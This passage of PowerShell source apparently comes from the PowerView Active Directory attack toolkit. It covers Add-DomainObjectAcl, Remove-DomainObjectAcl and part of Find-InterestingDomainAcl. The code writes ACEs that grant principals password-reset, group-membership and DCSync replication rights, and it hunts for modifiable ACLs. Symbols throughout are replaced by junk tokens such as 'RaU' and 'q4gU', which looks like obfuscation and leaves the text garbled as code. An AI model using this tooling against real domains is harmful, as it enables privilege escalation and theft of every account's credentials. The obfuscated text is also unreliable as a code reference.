ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.LINK

https://adsecurity.org/?p=1906
https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String[]]
        RaUTargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUTargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaUTargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUTargetSearchBase,

        [Parameter(Mandatory = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUPrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUPrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet(q4gUAllq4gU, q4gUResetPasswordq4gU, q4gUWriteMembersq4gU, q4gUDCSyncq4gU)]
        [String]
        RaURights = q4gUAllq4gU,

        [Guid]
        RaURightsGUID
    )

    BEGIN {
        RaUTargetSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUdistinguishednameq4gU
            q4gURawq4gU = RaUTrue
        }
        if (RaUPSBoundParameters[q4gUTargetDomainq4gU]) { RaUTargetSearcherArguments[q4gUDomainq4gU] = RaUTargetDomain }
        if (RaUPSBoundParameters[q4gUTargetLDAPFilterq4gU]) { RaUTargetSearcherArguments[q4gULDAPFilterq4gU] = RaUTargetLDAPFilter }
        if (RaUPSBoundParameters[q4gUTargetSearchBaseq4gU]) { RaUTargetSearcherArguments[q4gUSearchBaseq4gU] = RaUTargetSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUTargetSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUTargetSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUTargetSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUTargetSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUTargetSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUTargetSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUPrincipalSearcherArguments = @{
            q4gUIdentityq4gU = RaUPrincipalIdentity
            q4gUPropertiesq4gU = q4gUdistinguishedname,objectsidq4gU
        }
        if (RaUPSBoundParameters[q4gUPrincipalDomainq4gU]) { RaUPrincipalSearcherArguments[q4gUDomainq4gU] = RaUPrincipalDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUPrincipalSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUPrincipalSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUPrincipalSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUPrincipalSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUPrincipalSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUPrincipalSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUPrincipals = Get-DomainObject @PrincipalSearcherArguments
        if (-not RaUPrincipals) {
            throw Oj8XUnable to resolve principal: RaUPrincipalIdentityOj8X
        }
    }

    PROCESS {
        RaUTargetSearcherArguments[q4gUIdentityq4gU] = RaUTargetIdentity
        RaUTargets = Get-DomainObject @TargetSearcherArguments

        ForEach (RaUTargetObject in RaUTargets) {

            RaUInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] q4gUNoneq4gU
            RaUControlType = [System.Security.AccessControl.AccessControlType] q4gUAllowq4gU
            RaUACEs = @()

            if (RaURightsGUID) {
                RaUGUIDs = @(RaURightsGUID)
            }
            else {
                RaUGUIDs = Switch (RaURights) {
                    # ResetPassword doesnq4gUt need to know the userq4gUs current password
                    q4gUResetPasswordq4gU { q4gU00299570-246d-11d0-a768-00aa006e0529q4gU }
                    # allows for the modification of group membership
                    q4gUWriteMembersq4gU { q4gUbf9679c0-0de6-11d0-a285-00aa003049e2q4gU }
                    # q4gUDS-Replication-Get-Changesq4gU = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # q4gUDS-Replication-Get-Changes-Allq4gU = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # q4gUDS-Replication-Get-Changes-In-Filtered-Setq4gU = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domainq4gUs ACL, allows for the use of DCSync
                    q4gUDCSyncq4gU { q4gU1131f6aa-9c07-11d1-f79f-00c04fc2dcd2q4gU, q4gU1131f6ad-9c07-11d1-f79f-00c04fc2dcd2q4gU, q4gU89e95b76-444d-4c62-991a-0facbeda640cq4gU}
                }
            }

            ForEach (RaUPrincipalObject in RaUPrincipals) {
                Write-Verbose Oj8X[Add-DomainObjectAcl] Granting principal RaU(RaUPrincipalObject.distinguishedname) q4gURaURightsq4gU on RaU(RaUTargetObject.Properties.distinguishedname)Oj8X

                try {
                    RaUIdentity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]RaUPrincipalObject.objectsid)

                    if (RaUGUIDs) {
                        ForEach (RaUGUID in RaUGUIDs) {
                            RaUNewGUID = New-Object Guid RaUGUID
                            RaUADRights = [System.DirectoryServices.ActiveDirectoryRights] q4gUExtendedRightq4gU
                            RaUACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule RaUIdentity, RaUADRights, RaUControlType, RaUNewGUID, RaUInheritanceType
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        RaUADRights = [System.DirectoryServices.ActiveDirectoryRights] q4gUGenericAllq4gU
                        RaUACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule RaUIdentity, RaUADRights, RaUControlType, RaUInheritanceType
                    }

                    # add all the new ACEs to the specified object directory entry
                    ForEach (RaUACE in RaUACEs) {
                        Write-Verbose Oj8X[Add-DomainObjectAcl] Granting principal RaU(RaUPrincipalObject.distinguishedname) rights GUID q4gURaU(RaUACE.ObjectType)q4gU on RaU(RaUTargetObject.Properties.distinguishedname)Oj8X
                        RaUTargetEntry = RaUTargetObject.GetDirectoryEntry()
                        RaUTargetEntry.PsBase.Options.SecurityMasks = q4gUDaclq4gU
                        RaUTargetEntry.PsBase.ObjectSecurity.AddAccessRule(RaUACE)
                        RaUTargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose Oj8X[Add-DomainObjectAcl] Error granting principal RaU(RaUPrincipalObject.distinguishedname) q4gURaURightsq4gU on RaU(RaUTargetObject.Properties.distinguishedname) : RaU_Oj8X
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {
<#
.SYNOPSIS

Removes an ACL from a specific active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
q4gUAllq4gU, q4gUResetPasswordq4gU, q4gUWriteMembersq4gU, q4gUDCSyncq4gU, or a manual extended
rights GUID can be set with -RightsGUID. These rights are removed from the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, q4gUAllq4gU, q4gUResetPasswordq4gU, q4gUWriteMembersq4gU, q4gUDCSyncq4gU.
Defaults to q4gUAllq4gU.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

RaUUserSID = Get-DomainUser user wZ5t Select-Object -ExpandProperty objectsid
Get-DomainObjectACL user2 -ResolveGUIDs wZ5t Where-Object {RaU_.securityidentifier -eq RaUUserSID}

[no results returned]

Add-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs wZ5t Where-Object {RaU_.securityidentifier -eq RaUUserSID }

AceQualifier           : AccessAllowed
ObjectDN               : CN=user2,CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-883232822-274137685-4173207997-2105
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-883232822-274137685-4173207997-2104
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0


Remove-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs wZ5t Where-Object {RaU_.securityidentifier -eq RaUUserSID}

[no results returned]

.LINK

https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String[]]
        RaUTargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUTargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaUTargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUTargetSearchBase,

        [Parameter(Mandatory = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUPrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUPrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet(q4gUAllq4gU, q4gUResetPasswordq4gU, q4gUWriteMembersq4gU, q4gUDCSyncq4gU)]
        [String]
        RaURights = q4gUAllq4gU,

        [Guid]
        RaURightsGUID
    )

    BEGIN {
        RaUTargetSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUdistinguishednameq4gU
            q4gURawq4gU = RaUTrue
        }
        if (RaUPSBoundParameters[q4gUTargetDomainq4gU]) { RaUTargetSearcherArguments[q4gUDomainq4gU] = RaUTargetDomain }
        if (RaUPSBoundParameters[q4gUTargetLDAPFilterq4gU]) { RaUTargetSearcherArguments[q4gULDAPFilterq4gU] = RaUTargetLDAPFilter }
        if (RaUPSBoundParameters[q4gUTargetSearchBaseq4gU]) { RaUTargetSearcherArguments[q4gUSearchBaseq4gU] = RaUTargetSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUTargetSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUTargetSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUTargetSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUTargetSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUTargetSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUTargetSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUPrincipalSearcherArguments = @{
            q4gUIdentityq4gU = RaUPrincipalIdentity
            q4gUPropertiesq4gU = q4gUdistinguishedname,objectsidq4gU
        }
        if (RaUPSBoundParameters[q4gUPrincipalDomainq4gU]) { RaUPrincipalSearcherArguments[q4gUDomainq4gU] = RaUPrincipalDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUPrincipalSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUPrincipalSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUPrincipalSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUPrincipalSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUPrincipalSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUPrincipalSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUPrincipals = Get-DomainObject @PrincipalSearcherArguments
        if (-not RaUPrincipals) {
            throw Oj8XUnable to resolve principal: RaUPrincipalIdentityOj8X
        }
    }

    PROCESS {
        RaUTargetSearcherArguments[q4gUIdentityq4gU] = RaUTargetIdentity
        RaUTargets = Get-DomainObject @TargetSearcherArguments

        ForEach (RaUTargetObject in RaUTargets) {

            RaUInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] q4gUNoneq4gU
            RaUControlType = [System.Security.AccessControl.AccessControlType] q4gUAllowq4gU
            RaUACEs = @()

            if (RaURightsGUID) {
                RaUGUIDs = @(RaURightsGUID)
            }
            else {
                RaUGUIDs = Switch (RaURights) {
                    # ResetPassword doesnq4gUt need to know the userq4gUs current password
                    q4gUResetPasswordq4gU { q4gU00299570-246d-11d0-a768-00aa006e0529q4gU }
                    # allows for the modification of group membership
                    q4gUWriteMembersq4gU { q4gUbf9679c0-0de6-11d0-a285-00aa003049e2q4gU }
                    # q4gUDS-Replication-Get-Changesq4gU = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # q4gUDS-Replication-Get-Changes-Allq4gU = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # q4gUDS-Replication-Get-Changes-In-Filtered-Setq4gU = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domainq4gUs ACL, allows for the use of DCSync
                    q4gUDCSyncq4gU { q4gU1131f6aa-9c07-11d1-f79f-00c04fc2dcd2q4gU, q4gU1131f6ad-9c07-11d1-f79f-00c04fc2dcd2q4gU, q4gU89e95b76-444d-4c62-991a-0facbeda640cq4gU}
                }
            }

            ForEach (RaUPrincipalObject in RaUPrincipals) {
                Write-Verbose Oj8X[Remove-DomainObjectAcl] Removing principal RaU(RaUPrincipalObject.distinguishedname) q4gURaURightsq4gU from RaU(RaUTargetObject.Properties.distinguishedname)Oj8X

                try {
                    RaUIdentity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]RaUPrincipalObject.objectsid)

                    if (RaUGUIDs) {
                        ForEach (RaUGUID in RaUGUIDs) {
                            RaUNewGUID = New-Object Guid RaUGUID
                            RaUADRights = [System.DirectoryServices.ActiveDirectoryRights] q4gUExtendedRightq4gU
                            RaUACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule RaUIdentity, RaUADRights, RaUControlType, RaUNewGUID, RaUInheritanceType
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        RaUADRights = [System.DirectoryServices.ActiveDirectoryRights] q4gUGenericAllq4gU
                        RaUACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule RaUIdentity, RaUADRights, RaUControlType, RaUInheritanceType
                    }

                    # remove all the specified ACEs from the specified object directory entry
                    ForEach (RaUACE in RaUACEs) {
                        Write-Verbose Oj8X[Remove-DomainObjectAcl] Granting principal RaU(RaUPrincipalObject.distinguishedname) rights GUID q4gURaU(RaUACE.ObjectType)q4gU on RaU(RaUTargetObject.Properties.distinguishedname)Oj8X
                        RaUTargetEntry = RaUTargetObject.GetDirectoryEntry()
                        RaUTargetEntry.PsBase.Options.SecurityMasks = q4gUDaclq4gU
                        RaUTargetEntry.PsBase.ObjectSecurity.RemoveAccessRule(RaUACE)
                        RaUTargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose Oj8X[Remove-DomainObjectAcl] Error removing principal RaU(RaUPrincipalObject.distinguishedname) q4gURaURightsq4gU from RaU(RaUTargetObject.Properties.distinguishedname) : RaU_Oj8X
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {
<#
.SYNOPSIS

Finds object ACLs in the current (or specified) domain with modification
rights set to non-built in objects.

Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectAcl, Get-DomainObject, Convert-ADName  

.DESCRIPTION

This function enumerates the ACLs for every object in the domain with Get-DomainObjectAcl,
and for each returned ACE entry it checks if principal security identifier
is *-1000 (meaning the account is not built in), and also checks if the rights for
the ACE mean the object can be modified by the principal. If these conditions are met,
then the security identifier SID is translated, the domain object is retrieved, and
additional IdentityReference* information is appended to the output object.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-InterestingDomainAcl

Finds interesting object ACLS in the current domain.

.EXAMPLE

Find-InterestingDomainAcl -Domain dev.testlab.local -ResolveGUIDs

Finds interesting object ACLS in the ev.testlab.local domain and
resolves rights GUIDs to display names.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Find-InterestingDomainAcl -Credential RaUCred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ACLq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDomainNameq4gU, q4gUNameq4gU)]
        [String]
        RaUDomain,

        [Switch]
        RaUResolveGUIDs,

        [String]
        [ValidateSet(q4gUAllq4gU, q4gUResetPasswordq4gU, q4gUWriteMembersq4gU)]
        RaURightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUACLArguments = @{}
        if (RaUPSBoundParameters[q4gUResolveGUIDsq4gU]) { RaUACLArguments[q4gUResolveGUIDsq4gU] = RaUResolveGUIDs }
        if (RaUPSBoundParameters[q4gURightsFilterq4gU]) { RaUACLArguments[q4gURightsFilterq4gU] = RaURightsFilter }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUACLArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUACLArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUACLArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUACLArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUACLArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUACLArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUACLArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUACLArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUObjectSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUsamaccountname,objectclassq4gU
            q4gURawq4gU = RaUTrue
        }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUObjectSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUObjectSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUObjectSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUObjectSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUObjectSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUObjectSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUADNameArguments = @{}
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUADNameArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUADNameArguments[q4gUCredentialq4gU] = RaUCredential }

        # ongoing list of built-up SIDs
        RaUResolvedSIDs = @{}
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUDomainq4gU]) {
            RaUACLArguments[q4gUDomainq4gU] = RaUDomain
            RaUADNameArguments[q4gUDomainq4gU] = RaUDomain
        }

        Get-DomainObjectAcl @ACLArguments wZ5t ForEach-Object {

            if ( (RaU_.ActiveDirectoryRights -match q4gUGenericAllwZ5tWritewZ5tCreatewZ5tDeleteq4gU) -or ((RaU_.ActiveDirectoryRights -match q4gUExtendedRightq4gU) -and (RaU_.AceQualifier -match q4gUAllowq4gU))) {
                # only process SIDs > 1000
                if (RaU_.SecurityIdentifier.Value -match q4gU^S-1-5-.*-[1-9]ScKjd{3,}RaUq4gU) {
                    if (RaUResolvedSIDs[RaU_.SecurityIdentifier.Value]) {
                        RaUIdentityReferenceName, RaUIdentityReferenceDomain, RaUIdentityReferenceDN, RaUIdentityReferenceClass = RaUResolvedSIDs[RaU_.SecurityIdentifier.Value]

                        RaUInterestingACL = New-Object PSObject
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUObjectDNq4gU RaU_.ObjectDN
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUAceQualifierq4gU RaU_.AceQualifier
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUActiveDirectoryRightsq4gU RaU_.ActiveDirectoryRights
                        if (RaU_.ObjectAceType) {
                            RaUInterestingACL wZ5t Add-Member NoteProperty q4gUObjectAceTypeq4gU RaU_.ObjectAceType
                        }
                        else {
                            RaUInterestingACL wZ5t Add-Member NoteProperty q4gUObjectAceTypeq4gU q4gUNoneq4gU
                        }
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUAceFlagsq4gU RaU_.AceFlags
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUAceTypeq4gU RaU_.AceType
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUInheritanceFlagsq4gU RaU_.InheritanceFlags
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUSecurityIdentifierq4gU RaU_.SecurityIdentifier
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUIdentityReferenceNameq4gU RaUIdentityReferenceName
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUIdentityReferenceDomainq4gU RaUIdentityReferenceDomain
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUIdentityReferenceDNq4gU RaUIdentityReferenceDN
                        RaUInterestingACL wZ5t Add-Member NoteProperty q4gUIdentityReferenceClassq4gU RaUIdentityReferenceClass
                        RaUInterestingACL
                    }
                    else {
                        RaUIdentityReferenceDN = Convert-ADName -Identity RaU_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        # Oj8XIdentityReferenceDN: RaUIdentityReferenceDNOj8X

                        if (RaUIdentityReferenceDN) {
                            RaUIdentityReferenceDomain = RaUIdentityReferenceDN.SubString(RaUIdentityReferenceDN.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                            # Oj8XIdentityReferenceDomain: RaUIdentityReferenceDomainOj8X
                            RaUObjectSearcherArguments[q4gUDomainq4gU] = RaUIdentityReferenceDomain
                            RaUObjectSearcherArguments[q4gUIdentityq4gU] = RaUIdentityReferenceDN
